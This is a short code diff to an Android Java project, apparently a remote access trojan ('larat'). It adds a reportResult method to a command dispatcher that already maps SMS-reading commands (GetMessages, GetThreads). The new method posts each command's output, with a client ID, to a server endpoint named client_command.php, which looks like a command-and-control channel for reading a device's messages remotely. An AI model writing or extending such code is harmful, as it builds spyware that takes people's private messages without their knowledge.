@@ -2,6 +2,10 @@ package com.c4wd.commands;
 
 import android.os.AsyncTask;
 
+import com.c4wd.larat.Constants;
+import com.c4wd.larat.RestClient;
+import com.loopj.android.http.RequestParams;
+
 import java.util.HashMap;
 
 /**
@@ -34,5 +38,14 @@ public class Command {
             commandList.put("GetMessages", SMSCommands.GetMessagesTask.class);
             commandList.put("GetThreads", SMSCommands.GetThreadsTask.class);
         }
+    }
+
+    public static void reportResult(String result) {
+        RequestParams params = new RequestParams();
+        params.put("command", "addMessage");
+        params.put("client_id", Constants.CLIENT_ID);
+        params.put("message_type", "COMMAND_COMPLETED");
+        params.put("message", result);
+        RestClient.post("client_command.php", params);
     }
 }
